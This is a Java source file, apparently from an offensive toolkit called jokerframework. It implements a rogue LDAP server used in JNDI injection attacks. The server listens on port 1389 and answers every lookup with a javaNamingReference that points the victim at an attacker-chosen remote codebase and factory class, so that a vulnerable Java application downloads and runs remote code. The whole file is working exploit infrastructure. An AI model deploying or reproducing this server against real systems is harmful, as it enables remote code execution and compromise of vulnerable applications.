package com.lucifaer.jokerframework.joker.server;

import com.lucifaer.jokerframework.sdk.context.ShellContext;
import com.lucifaer.jokerframework.joker.core.server.BaseServer;
import com.lucifaer.jokerframework.joker.core.server.Server;
import com.lucifaer.jokerframework.joker.core.shell.ShellThrowableHandler;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Map;

/**
 * LdapServer为ldap服务的具体实现类
 * @author Lucifaer
 * @version 3.0
 */
@Component
@Scope("prototype")
public class LdapServer extends BaseServer implements Server {
    private final ShellThrowableHandler shellThrowableHandler;
    private InMemoryDirectoryServer ds;

    private static final String defaultUrl = "0.0.0.0";
    private static final String defaultPort = "1389";

    public LdapServer(ShellThrowableHandler shellThrowableHandler) {
        this.shellThrowableHandler = shellThrowableHandler;
        this.serverName = "ldap-server";
        this.serverUrl = defaultUrl;
        this.serverPort = defaultPort;
        this.requiredParams.add("remote_className");
        this.requiredParams.add("remote_factoryLocation");
    }

    @Override
    public void createServer(ShellContext shellContext) {
        Map<String, String> shellParams = shellContext.getParams();
        String className = shellParams.get("remote_className");
        String factoryLocation = shellParams.get("remote_factoryLocation");
        String codebase = factoryLocation + "/#" + className;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=exploit, dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig("listen", InetAddress.getByName(this.serverUrl), Integer.parseInt(this.serverPort), ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer.OperationInterceptor(new URL(codebase)));
            ds = new InMemoryDirectoryServer(config);
            ds.startListening();
        } catch (LDAPException | UnknownHostException | MalformedURLException e) {
            shellThrowableHandler.handleThrowable(e);
        }
    }

    @Override
    public void stopServer() {
        this.ds.shutDown("listen", true);
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);

            try {
                this.sendResult(result, base, e);
            }catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) {
            try {
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf(35);
                if (refPos > 0) {
                    cbstring = cbstring.substring(0, refPos);
                }

                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (LDAPException ldapException) {
                ldapException.printStackTrace();
            }
        }
    }
}
